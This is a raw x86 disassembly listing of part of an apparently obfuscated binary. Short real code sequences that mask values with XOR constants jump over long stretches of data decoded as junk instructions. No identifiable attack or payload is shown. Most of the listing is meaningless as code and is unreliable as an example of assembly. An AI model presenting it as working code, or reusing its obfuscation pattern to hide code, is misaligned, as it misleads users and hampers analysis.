  40d6be:	pop    ebp
  40d6bf:	jmp    0xcbb0:0x1f40eb8b
  40d6c6:	das    
  40d6c7:	xor    DWORD PTR [edx-0x9],0x86a5242
  40d6ce:	mov    eax,ds:0xdaa65711
  40d6d3:	xchg   ebp,eax
  40d6d4:	adc    eax,0x444f5566
  40d6d9:	test   al,0xe2
  40d6db:	in     eax,dx
  40d6dc:	adc    esp,DWORD PTR [esi-0x7759b3c6]
  40d6e2:	dec    edi
  40d6e3:	out    0xfb,eax
  40d6e5:	fnsetpm(287 only) 
  40d6e7:	ror    DWORD PTR [ebx+eax*1],cl
  40d6ea:	add    esi,DWORD PTR [eax-0x74b2d049]
  40d6f0:	inc    ebp
  40d6f1:	cld    
  40d6f2:	xor    eax,0x7510854
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    edx,ss
  40d727:	scas   al,BYTE PTR es:[edi]
  40d728:	shr    DWORD PTR [edx+0x5],1
  40d72b:	lea    edi,[esi+0x7e]
  40d72e:	and    bh,BYTE PTR [edi+0x7e]
  40d731:	jle    0x40d6de
  40d733:	and    eax,0xa59b599f
  40d738:	lds    edx,FWORD PTR [edi]
  40d73a:	mov    DWORD PTR ds:0x90c64353,ebx
  40d740:	push   ecx
  40d741:	stos   BYTE PTR es:[edi],al
  40d742:	ret    
  40d743:	aaa    
  40d744:	int    0x1c
  40d746:	xor    eax,edx
  40d748:	aam    0xdb
  40d74a:	jno    0x40d6f6
  40d74c:	mov    eax,0xaf7718a9
  40d751:	cmp    DWORD PTR [eax],esp
  40d753:	pop    es
  40d754:	je     0x40d73f
  40d756:	(bad)  
  40d757:	xor    cl,dl
  40d759:	jl     0x40d7ce
  40d75b:	cld    
  40d75c:	cmp    BYTE PTR ds:0xbb79dd0e,al
  40d762:	mov    bh,0x65
  40d764:	fisubr WORD PTR [eax-0x42484658]
  40d76a:	adc    eax,0x7ccbb4cd
  40d76f:	mov    ebp,DWORD PTR [edi+0x3e6cc981]
  40d775:	in     eax,0xa8
  40d777:	loop   0x40d7d6
  40d779:	jecxz  0x40d7a4
  40d77b:	aaa    
  40d77c:	cmp    ah,BYTE PTR [esi+0x312d0406]
  40d782:	xor    BYTE PTR [edi+ebx*4],ah
  40d785:	shl    DWORD PTR [edi],1
  40d787:	std    
  40d788:	sub    eax,0xfb6ae533
  40d78d:	mov    bh,0xa6
  40d78f:	dec    ebp
  40d790:	sbb    BYTE PTR [eax+0x79],bh
  40d793:	mov    ecx,0x39198a84
  40d798:	sbb    eax,0x752d7b33
  40d79d:	push   0xffffffbe
  40d79f:	pop    esi
  40d7a0:	jae    0x40d78d
  40d7a2:	js     0x40d792
  40d7a4:	sbb    ebx,DWORD PTR [eax+0x78]
  40d7a7:	lods   al,BYTE PTR ds:[esi]
  40d7a8:	cdq    
  40d7a9:	iret   
  40d7aa:	xor    DWORD PTR [eax-0x61],edx
  40d7ad:	or     BYTE PTR ds:0x1c5da9e6,bl
  40d7b3:	push   cs
  40d7b4:	jno    0x40d74d
  40d7b6:	outs   dx,DWORD PTR ds:[esi]
  40d7b7:	inc    edi
  40d7b8:	jo     0x40d7ae
  40d7ba:	lea    ebp,[esi+ebp*2]
  40d7bd:	and    eax,0x489dc8d
  40d7c2:	fisubr DWORD PTR [ebx+0x47964ec6]
  40d7c8:	sar    BYTE PTR [edx-0x64],cl
  40d7cb:	xor    DWORD PTR [ebp-0xb7106a6],ebp
  40d7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7d2:	mov    BYTE PTR [ebx],0xca
  40d7d5:	xchg   ebp,eax
  40d7d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7d7:	jecxz  0x40d7cb
  40d7d9:	test   al,0x7d
  40d7db:	ds fs ret 0x76b7
  40d7e0:	ss mov ah,0x1b
  40d7e3:	rcr    BYTE PTR [ebp-0x71ecc954],0xa5
  40d7ea:	nop
  40d7eb:	sbb    BYTE PTR [edx+0x3],0xa2
  40d7ef:	nop
  40d7f0:	pop    es
  40d7f1:	sbb    al,0xe1
  40d7f3:	int3   
  40d7f4:	mov    esp,0x28faea17
  40d7f9:	das    
  40d7fa:	mov    bh,0xea
  40d7fc:	mov    ds:0x3cbe3949,al
  40d801:	idiv   DWORD PTR [esi+0x1c]
  40d804:	shl    ebx,0xc8
  40d807:	hlt    
  40d808:	fcomp  st(6)
  40d80a:	stos   DWORD PTR es:[edi],eax
  40d80b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d80c:	and    al,0xc1
  40d80e:	es inc edi
  40d810:	pop    eax
  40d811:	aas    
  40d812:	jae    0x40d838
  40d814:	dec    ebp
  40d815:	pop    esp
  40d816:	fcmovne st,st(1)
  40d818:	in     eax,0x8f
  40d81a:	lods   al,BYTE PTR ds:[esi]
  40d81b:	pop    eax
  40d81c:	push   edi
  40d81d:	shl    DWORD PTR [ecx],1
  40d81f:	or     DWORD PTR [ebp-0x2d],edx
  40d822:	pop    edi
  40d823:	jp     0x40d7ed
  40d825:	push   esi
  40d826:	jmp    0xa633c381
  40d82b:	ret    
  40d82c:	pop    esi
  40d82d:	lods   eax,DWORD PTR ds:[esi]
  40d82e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d82f:	scas   al,BYTE PTR es:[edi]
  40d830:	xor    edi,ecx
  40d832:	pop    eax
  40d833:	or     BYTE PTR [esi+0x72],cl
  40d836:	loop   0x40d7cd
  40d838:	(bad)  
  40d839:	jle    0x40d8b1
  40d83b:	push   0xffffffc8
  40d83d:	xchg   ecx,eax
  40d83e:	imul   eax,DWORD PTR [eax+0x19],0xf
  40d842:	adc    edx,DWORD PTR [edi+0x41]
  40d845:	adc    DWORD PTR [edi+0x75],ecx
  40d848:	sbb    dl,ah
  40d84a:	sub    DWORD PTR [ebx-0xd97c1c5],esi
  40d850:	mov    eax,ds:0x9220f124
  40d855:	xor    DWORD PTR [eax-0x40],ecx
  40d858:	push   0x7bc1ab1e
  40d85d:	inc    eax
  40d85e:	pop    ecx
  40d85f:	push   0x5
  40d861:	dec    ecx
  40d862:	pop    ebx
  40d863:	xchg   ebx,ecx
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	ins    BYTE PTR es:[edi],dx
  40d879:	sub    eax,edi
  40d87b:	xchg   esp,eax
  40d87c:	sub    DWORD PTR [edx+0x7f227e7e],ecx
  40d882:	jle    0x40d902
  40d884:	mov    BYTE PTR ds:0x1222ee62,ch
  40d88a:	or     DWORD PTR [ebx],0xc9bdc613
  40d890:	out    0x52,al
  40d892:	push   ebp
  40d893:	xlat   BYTE PTR ds:[ebx]
  40d894:	adc    eax,0xe2ab1b32
  40d899:	push   ebp
  40d89a:	test   eax,0x52705a96
  40d89f:	pop    ebp
  40d8a0:	mov    dh,0xb8
  40d8a2:	xlat   BYTE PTR ds:[ebx]
  40d8a3:	jmp    FWORD PTR [edx+ebx*8-0x14340aaa]
  40d8aa:	xchg   esp,eax
  40d8ab:	icebp  
  40d8ac:	jae    0x40d87d
  40d8ae:	jl     0x40d832
  40d8b0:	call   0x70a8ec8b
  40d8b5:	cmp    ebp,DWORD PTR [edi+0x22]
  40d8b8:	clc    
  40d8b9:	pop    ebx
  40d8ba:	fstp   st(7)
  40d8bc:	shl    DWORD PTR [ebx+0x44],1
  40d8bf:	les    ecx,FWORD PTR [edi-0x17]
  40d8c2:	xchg   esi,eax
  40d8c3:	add    al,0xd1
  40d8c5:	and    eax,0xfb1e850c
  40d8ca:	das    
  40d8cb:	or     ecx,eax
  40d8cd:	shufps xmm7,XMMWORD PTR [ebx-0x6e7da758],0x33
  40d8d5:	scas   al,BYTE PTR es:[edi]
  40d8d6:	and    edx,DWORD PTR [ecx]
  40d8d8:	cmc    
  40d8d9:	inc    esi
  40d8da:	sub    eax,0x48689bad
  40d8df:	jmp    0xc0ed:0x7890ad09
  40d8e6:	pop    esp
  40d8e7:	adc    eax,0x272f30
  40d8ec:	push   ebp
  40d8ed:	cmc    
  40d8ee:	fadd   DWORD PTR [esi-0x5840d159]
  40d8f4:	pop    es
  40d8f5:	cmp    eax,0xd4bfe698
  40d8fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8fb:	mov    ecx,0xc3dc454f
  40d900:	rcl    ah,1
  40d902:	popa   
  40d903:	mov    DWORD PTR [ebx],esp
  40d905:	sbb    cl,bl
  40d907:	jp     0x40d953
  40d909:	xor    al,0x43
  40d90b:	repnz mov dl,0xb1
  40d90e:	pop    es
  40d90f:	xor    ebx,DWORD PTR ds:0x8ed4967d
  40d915:	cmp    eax,0x7edc35b1
  40d91a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d91b:	aam    0xc4
  40d91d:	inc    DWORD PTR [ebp-0x20]
  40d920:	push   es
  40d921:	dec    esp
  40d922:	scas   eax,DWORD PTR es:[edi]
  40d923:	adc    dh,bl
  40d925:	mov    ah,0x71
  40d927:	(bad)  
  40d928:	ins    BYTE PTR es:[edi],dx
  40d929:	xchg   cl,al
  40d92b:	out    dx,eax
  40d92c:	xor    ah,BYTE PTR [edi]
  40d92e:	sbb    ebp,esi
  40d930:	jbe    0x40d9b0
  40d932:	mov    dh,0x76
  40d934:	fnstsw WORD PTR [edx+esi*4]
  40d937:	scas   eax,DWORD PTR es:[edi]
  40d938:	xchg   edx,eax
  40d939:	dec    esp
  40d93b:	test   esp,0x80dbf94f
  40d941:	test   DWORD PTR [edx+0x4dfb44fa],ebp
  40d947:	cs ss xchg edi,eax
  40d94a:	mov    eax,0x9c7fe28c
  40d94f:	sahf   
  40d950:	dec    ebp
  40d951:	pop    ss
  40d952:	js     0x40d98b
  40d954:	push   ebx
  40d955:	xchg   ebx,eax
  40d956:	sar    DWORD PTR [ecx+edx*1-0x45557386],cl
  40d95d:	mov    al,ds:0x53c2a05
  40d962:	jnp    0x40d91b
  40d964:	and    dl,BYTE PTR ds:0xe1203415
  40d96a:	fld    TBYTE PTR [eax-0x18570a57]
  40d970:	xchg   esp,ebp
  40d972:	js     0x40d90f
  40d974:	loope  0x40d9ee
  40d976:	push   cs
  40d977:	add    ebp,esp
  40d979:	lds    edx,FWORD PTR [ecx-0x2d7445f4]
  40d97f:	(bad)  
  40d980:	mov    eax,ds:0x3087e8b1
  40d985:	jle    0x40d9d3
  40d987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d988:	call   0x9c4a:0xa00b9d49
  40d98f:	scas   al,BYTE PTR es:[edi]
  40d990:	xchg   edi,eax
  40d991:	push   esp
  40d992:	dec    ebp
  40d993:	es or  al,0x54
  40d996:	jns    0x40d9d4
  40d998:	out    0xdf,al
  40d99a:	loopne 0x40d95f
  40d99c:	ins    DWORD PTR es:[edi],dx
  40d99d:	and    al,0x6b
  40d99f:	cld    
  40d9a0:	out    dx,eax
  40d9a1:	lods   al,BYTE PTR ds:[esi]
  40d9a2:	jns    0x40d981
  40d9a4:	jae    0x40d9cc
  40d9a6:	jle    0x40d94f
  40d9a8:	out    dx,eax
  40d9a9:	dec    esp
  40d9aa:	jecxz  0x40d9ee
  40d9ac:	stc    
  40d9ad:	adc    eax,0xcb876dee
  40d9b2:	jmp    0x40dafb
  40d9b7:	mov    ebx,0xf146cba5
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	ins    BYTE PTR es:[edi],dx
  40d9c4:	cwde   
  40d9c5:	push   0x7e8bdd60
  40d9ca:	jle    0x40d9ee
  40d9cc:	jg     0x40da4c
  40d9ce:	jle    0x40d955
  40d9d0:	dec    ebp
  40d9d1:	pop    ecx
  40d9d2:	jecxz  0x40d9e4
  40d9d4:	jbe    0x40d969
  40d9d6:	shr    BYTE PTR [edi],0xb7
  40d9d9:	jae    0x40d9ee
  40d9db:	push   0x3f7f2dd3
  40d9e0:	cmc    
  40d9e1:	mov    ch,0xab
  40d9e3:	pop    es
  40d9e4:	leave  
  40d9e5:	lahf   
  40d9e6:	add    DWORD PTR [eax-0x3c],esp
  40d9e9:	sub    eax,ebx
  40d9eb:	inc    edi
  40d9ec:	add    eax,0x95de7826
  40d9f1:	jge    0x40d9bf
  40d9f3:	pushf  
  40d9f4:	jmp    0x8cfe:0x5e34e2b6
  40d9fb:	scas   al,BYTE PTR es:[edi]
  40d9fc:	dec    ebx
  40d9fd:	push   ecx
  40d9fe:	ds inc esp
  40da00:	retf   0xba76
  40da03:	pop    ecx
  40da04:	adc    BYTE PTR [esi],dh
  40da06:	lock cmovns esi,ebx
  40da0a:	or     DWORD PTR [eax-0x7f],edx
  40da0d:	imul   edx,DWORD PTR [edx+eax*1+0x575be46a],0x3a70bc42
  40da18:	pop    ebx
  40da19:	jge    0x40da5f
  40da1b:	data16 or bl,BYTE PTR [ebp+0x14]
  40da1f:	das    
  40da20:	or     ebx,esi
  40da22:	pop    esi
  40da23:	fidiv  DWORD PTR [esi]
  40da25:	mov    dh,0x2
  40da27:	jno    0x40d9f9
  40da29:	mov    ebp,0xaae366a3
  40da2e:	jg     0x40da6f
  40da30:	adc    ebx,edi
  40da32:	pop    edx
  40da33:	addr16 js 0x40da36
  40da36:	xchg   esp,eax
  40da37:	xor    al,0x9a
  40da39:	daa    
  40da3a:	rcr    DWORD PTR [esi],cl
  40da3c:	inc    ebp
  40da3d:	lods   eax,DWORD PTR ds:[esi]
  40da3e:	nop
  40da3f:	jne    0x40d9dd
  40da41:	leave  
  40da42:	out    dx,al
  40da43:	jns    0x40d9db
  40da45:	add    DWORD PTR [eax],esp
  40da47:	jecxz  0x40d9df
  40da49:	mov    cl,0x55
  40da4b:	punpckhwd mm2,mm0
  40da4e:	or     al,0x7b
  40da50:	daa    
  40da51:	jns    0x40daac
  40da53:	imul   edx,DWORD PTR [esi+0x2b],0xd2eb2f50
  40da5a:	cmc    
  40da5b:	add    DWORD PTR [ebx-0x50176a04],esi
  40da61:	inc    esp
  40da62:	cmp    DWORD PTR ds:0xd46571d1,edi
  40da68:	dec    esi
  40da69:	mov    dh,0x5f
  40da6b:	sub    edi,esi
  40da6d:	cld    
  40da6e:	sub    BYTE PTR [eax-0x2e],0xcc
  40da72:	retf   
  40da73:	and    eax,0x4a683b5b
  40da78:	push   eax
  40da79:	dec    ebp
  40da7a:	mov    cl,0x92
  40da7c:	iret   
  40da7d:	pusha  
  40da7e:	sub    eax,0xcf3300ee
  40da83:	fwait
  40da84:	pop    ds
  40da85:	xlat   BYTE PTR ds:[ebx]
  40da86:	repz out 0x85,eax
  40da89:	lods   eax,DWORD PTR ds:[esi]
  40da8a:	test   ebx,edi
  40da8c:	xlat   BYTE PTR ds:[ebx]
  40da8d:	jp     0x40daf5
  40da8f:	xchg   DWORD PTR [esp+ebp*1],eax
  40da92:	sbb    BYTE PTR ds:[eax-0x71],ah
  40da96:	test   eax,0xf8f25793
  40da9b:	add    DWORD PTR [esi],ecx
  40da9d:	or     ch,BYTE PTR [esi+0x26]
  40daa0:	psubb  mm5,QWORD PTR [edx]
  40daa3:	rcr    BYTE PTR [esi-0x72],cl
  40daa6:	pop    esp
  40daa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daa8:	pop    ecx
  40daa9:	iret   
  40daaa:	popa   
  40daab:	test   BYTE PTR [esi],dl
  40daad:	hlt    
  40daae:	clc    
  40daaf:	mov    bl,dl
  40dab1:	adc    eax,0x25ba7f48
  40dab6:	jle    0x40db08
  40dab8:	sbb    BYTE PTR [esi-0x3a9391c4],cl
  40dabe:	or     bl,dh
  40dac0:	dec    esp
  40dac1:	iret   
  40dac2:	jae    0x40db2f
  40dac4:	int    0xac
  40dac6:	xchg   DWORD PTR ds:0x8e236fcd,esp
  40dacc:	jmp    0x1ecd75cc
  40dad1:	fld    QWORD PTR [edx+0x27]
  40dad4:	pop    edx
  40dad5:	mov    esp,0x2617d7ba
  40dada:	les    ecx,FWORD PTR [ebx-0x281d0c96]
  40dae0:	mov    dh,al
  40dae2:	push   esi
  40dae3:	pop    ebp
  40dae4:	dec    edi
  40dae5:	test   DWORD PTR [edi+0x5c5cdc93],ecx
  40daeb:	ja     0x40db69
  40daed:	mov    edi,DWORD PTR [edi-0x5d99f7b7]
  40daf3:	test   ch,0xe7
  40daf6:	test   al,0xcb
  40daf8:	neg    dl
  40dafa:	xchg   BYTE PTR [ecx-0x75],cl
  40dafd:	inc    ebp
  40dafe:	in     al,0xf
  40db00:	scas   eax,DWORD PTR es:[edi]
  40db01:	shr    DWORD PTR [ebx],0xe0
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0x31b6fdf0
  40db32:	mov    ebx,0x8881727c
  40db37:	jle    0x40dbb7
  40db39:	and    bh,BYTE PTR [edi+0x7e]
  40db3c:	jle    0x40db21
  40db3e:	fcomp  QWORD PTR [esi+0x7a4bdc4d]
  40db44:	pop    edi
  40db45:	and    BYTE PTR [esi-0x45],dl
  40db48:	fdivr  DWORD PTR [eax]
  40db4a:	jb     0x40dbc6
  40db4c:	loopne 0x40daf2
  40db4e:	jecxz  0x40dbc2
  40db50:	icebp  
  40db51:	into   
  40db52:	pop    ebx
  40db53:	int3   
  40db54:	xchg   ebx,eax
  40db55:	out    0x8d,eax
  40db57:	pop    eax
  40db58:	cmp    ebx,edx
  40db5a:	mov    WORD PTR [ecx-0x18],ss
  40db5d:	mov    dh,0x54
  40db5f:	pop    esi
  40db60:	mov    ds:0x1154acb,al
  40db65:	fxch   st(6)
  40db67:	jmp    0x8c7e:0x10784d4b
  40db6e:	data16 sub ch,0x3f
  40db72:	add    BYTE PTR [edx+eiz*4+0x7bbc0353],dl
  40db79:	mov    eax,edx
  40db7b:	repnz out 0xe7,al
  40db7e:	daa    
  40db7f:	addr16 int 0x62
  40db82:	iret   
  40db83:	adc    al,BYTE PTR [ecx+edi*4+0x58b41e2b]
  40db8a:	arpl   WORD PTR [ecx-0x58a4d853],bx
  40db90:	lods   eax,DWORD PTR ds:[esi]
  40db91:	and    BYTE PTR [ebx],cl
  40db93:	push   ss
  40db94:	icebp  
  40db95:	push   ebx
  40db96:	stc    
  40db97:	ins    BYTE PTR es:[edi],dx
  40db98:	push   esp
  40db99:	add    dh,BYTE PTR [edi+edi*2+0x6b8000ef]
  40dba0:	mov    dl,0xa6
  40dba2:	cli    
  40dba3:	arpl   WORD PTR [eax+0x79e6d8dd],si
  40dba9:	data16 or al,0x4d
  40dbac:	push   edx
  40dbad:	push   es
  40dbae:	add    DWORD PTR [esi],ecx
  40dbb0:	(bad)  
  40dbb1:	ret    0x8bc7
  40dbb4:	mov    eax,ds:0x8247cbba
  40dbb9:	rcl    DWORD PTR fs:[edi+0x5f],1
  40dbbd:	sahf   
  40dbbe:	cmp    dh,BYTE PTR [edx]
  40dbc0:	inc    ebp
  40dbc1:	add    ecx,DWORD PTR [edi-0x79]
  40dbc4:	call   0x7ae:0x31794c73
  40dbcb:	and    DWORD PTR [eax-0x36],edx
  40dbce:	push   cs
  40dbcf:	xor    BYTE PTR [edi+0x2d],dl
  40dbd2:	test   eax,0xd34e08e8
  40dbd7:	inc    ebx
  40dbd8:	int3   
  40dbd9:	jmp    0x38251b16
  40dbde:	in     eax,dx
  40dbdf:	mov    ch,0xa3
  40dbe1:	jnp    0x40db7d
  40dbe3:	sub    BYTE PTR [esi+0x2d],ch
  40dbe6:	mov    eax,0xf98a1b94
  40dbeb:	xchg   di,ax
  40dbed:	in     eax,0x96
  40dbef:	ja     0x40dbe8
  40dbf1:	mov    ebp,0x852a71bc
  40dbf6:	outs   dx,BYTE PTR ds:[esi]
  40dbf7:	mov    ecx,0x9a57462b
  40dbfc:	mov    ah,0x3e
  40dbfe:	scas   al,BYTE PTR es:[edi]
  40dbff:	mov    BYTE PTR [ecx-0x2f1d6200],bl
  40dc05:	jle    0x40dbad
  40dc07:	(bad)  
  40dc08:	test   al,0xac
  40dc0a:	test   BYTE PTR [esi],0x54
  40dc0d:	pop    edi
  40dc0e:	sub    BYTE PTR [edx-0x1a],dh
  40dc11:	add    BYTE PTR [edx],ch
  40dc13:	add    cl,BYTE PTR [edx-0xf]
  40dc16:	inc    esi
  40dc17:	inc    esi
  40dc18:	addr16 mov ch,0xff
  40dc1b:	dec    ecx
  40dc1c:	jo     0x40dbd1
  40dc1e:	inc    eax
  40dc1f:	xchg   ecx,eax
  40dc20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc21:	adc    ch,BYTE PTR [edi]
  40dc23:	cmp    al,0xbe
  40dc25:	popa   
  40dc26:	mov    ecx,0x91a9b9a1
  40dc2b:	and    al,0xc7
  40dc2d:	jle    0x40dc73
  40dc2f:	or     DWORD PTR [ebp+0x3f],eax
  40dc32:	mov    esp,edi
  40dc34:	and    eax,0xe9ddb8ca
  40dc39:	and    DWORD PTR [edx],0x29
  40dc3c:	sbb    al,0xb7
  40dc3e:	push   ebp
  40dc3f:	ret    
  40dc40:	sub    edi,DWORD PTR [edi]
  40dc42:	out    0xf9,al
  40dc44:	ds mov esi,0xb5daefcf
  40dc4a:	and    BYTE PTR [ebx+0x43abe340],bl
  40dc50:	push   edi
  40dc51:	mov    ds:0xef6ceda7,al
  40dc56:	mov    edx,DWORD PTR [edi-0x70]
  40dc59:	dec    esi
  40dc5a:	enter  0x5bf0,0x72
  40dc5e:	pop    DWORD PTR [eax]
  40dc60:	in     al,0x99
  40dc62:	xor    edx,DWORD PTR [ebp+0x1036ac06]
  40dc68:	popa   
  40dc69:	add    eax,edx
  40dc6b:	mov    edx,DWORD PTR [ebp+0x14]
  40dc6e:	imul   eax,DWORD PTR [edx]
  40dc71:	mov    edx,DWORD PTR [ebp-0x4]
  40dc74:	xor    edx,ecx
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcdd:	push   edx
  40dcde:	cmp    esp,DWORD PTR [ecx-0x4b]
  40dce1:	mov    DWORD PTR [esi+0x7e],edi
  40dce4:	and    bh,BYTE PTR [edi+0x7e]
  40dce7:	jle    0x40dcb7
  40dce9:	data16 mov cl,0x81
  40dcec:	(bad)  
  40dced:	not    ebp
  40dcef:	mov    dh,BYTE PTR [edi]
  40dcf1:	mov    ds:0x2eaf2ec,al
  40dcf6:	out    dx,eax
  40dcf7:	scas   eax,DWORD PTR es:[edi]
  40dcf8:	lds    edi,FWORD PTR [eax+0x6b]
  40dcfb:	aaa    
  40dcfc:	ds fcmovbe st,st(5)
  40dd00:	dec    edi
  40dd01:	bswap  ebp
  40dd03:	imul   ebx,DWORD PTR [ebx+0x2cc49671],0x39
  40dd0a:	cmp    eax,0x94129bf5
  40dd0f:	out    dx,eax
  40dd10:	ins    BYTE PTR es:[edi],dx
  40dd11:	mov    BYTE PTR [eax],0xe
  40dd14:	mov    gs,WORD PTR [edx+ebx*2]
  40dd17:	xor    al,0xf6
  40dd19:	adc    cl,BYTE PTR [ecx]
  40dd1b:	inc    eax
  40dd1c:	and    al,0x52
  40dd1e:	and    ebp,0xaea92b77
  40dd24:	pop    ecx
  40dd25:	pop    eax
  40dd26:	or     BYTE PTR [edi+ebx*8],0x31
  40dd2a:	jns    0x40dcc9
  40dd2c:	xchg   BYTE PTR [esi-0x70],al
  40dd2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd30:	out    dx,al
  40dd31:	out    0x64,al
  40dd33:	mov    al,ds:0xcbc7bb4
  40dd38:	jne    0x40dcc6
  40dd3a:	or     edi,ebp
  40dd3c:	scas   al,BYTE PTR es:[edi]
  40dd3d:	bound  ebx,QWORD PTR [ecx+0x11]
  40dd40:	pusha  
  40dd41:	push   edi
  40dd42:	and    BYTE PTR [eax-0x9115afa],al
  40dd48:	aas    
  40dd49:	shl    DWORD PTR [ecx],cl
  40dd4b:	outs   dx,BYTE PTR ds:[esi]
  40dd4c:	scas   eax,DWORD PTR es:[edi]
  40dd4d:	xchg   BYTE PTR [ebx],bl
  40dd4f:	inc    esi
  40dd50:	sub    BYTE PTR [esp+ebp*8-0x4f],dh
  40dd54:	ret    0x47fa
  40dd57:	aam    0x2b
  40dd59:	lahf   
  40dd5a:	xor    edi,DWORD PTR [edi+0x445e1b2f]
  40dd60:	outs   dx,BYTE PTR ds:[esi]
  40dd61:	mov    ebx,0x6ec6d65c
  40dd66:	push   ebp
  40dd67:	jle    0x40dd4f
  40dd69:	pop    ebp
  40dd6a:	mov    ecx,0xfdd431
  40dd6f:	or     DWORD PTR [ebx-0x36ca442e],edx
  40dd75:	xor    ch,al
  40dd77:	jmp    0xbb89:0xa0b14a2c
  40dd7e:	loop   0x40ddd8
  40dd80:	or     al,0x36
  40dd82:	jae    0x40dd54
  40dd84:	bound  ebx,QWORD PTR [ebx]
  40dd86:	or     dh,BYTE PTR [edx-0x2965d22e]
  40dd8c:	sub    DWORD PTR [eax-0x2a],ecx
  40dd8f:	js     0x40dd5c
  40dd91:	clc    
  40dd92:	cmp    BYTE PTR [ecx+eiz*2-0x7000c6cb],ah
  40dd99:	sub    eax,0x87a1584d
  40dd9e:	inc    edx
  40dd9f:	jne    0x40ddc3
  40dda1:	iret   
  40dda2:	mov    bh,0x1d
  40dda4:	xchg   edi,eax
  40dda5:	aad    0x8f
  40dda7:	aad    0xd6
  40dda9:	sahf   
  40ddaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddab:	xor    bl,0x5e
  40ddae:	rol    BYTE PTR [ebx-0x4e],cl
  40ddb1:	xchg   ebx,eax
  40ddb2:	ret    0xe681
  40ddb5:	add    ebp,ebx
  40ddb7:	push   0x34b2f919
  40ddbc:	inc    edi
  40ddbd:	popa   
  40ddbe:	inc    ebx
  40ddbf:	stos   DWORD PTR es:[edi],eax
  40ddc0:	fnstsw WORD PTR [ecx+edx*2]
  40ddc3:	(bad)  
  40ddc4:	cmp    eax,0xf55126a5
  40ddc9:	icebp  
  40ddca:	fst    QWORD PTR [edx-0x11]
  40ddcd:	mov    ds:0x9711b55,eax
  40ddd2:	adc    al,0x96
  40ddd4:	mov    esi,0x2b754eed
  40ddd9:	xchg   ecx,eax
  40ddda:	push   cs
  40dddb:	ror    DWORD PTR [eax],0x24
  40ddde:	push   esp
  40dddf:	sub    cl,BYTE PTR [ebp-0x62]
  40dde2:	or     DWORD PTR [ebp+0x40469000],eax
  40dde8:	push   es
  40dde9:	jno    0x40de37
  40ddeb:	inc    edi
  40ddec:	inc    ebp
  40dded:	or     BYTE PTR [ecx+0x28],ch
  40ddf0:	int    0x16
  40ddf2:	add    eax,0x36c47979
  40ddf7:	(bad)  
  40ddf8:	cmp    al,dh
  40ddfa:	push   esi
  40ddfb:	dec    eax
  40ddfc:	js     0x40de40
  40ddfe:	sbb    al,0x5c
  40de00:	js     0x40dda8
  40de02:	rcl    DWORD PTR [edx+edi*8-0x65dce73e],1
  40de09:	repnz sub eax,DWORD PTR [edx]
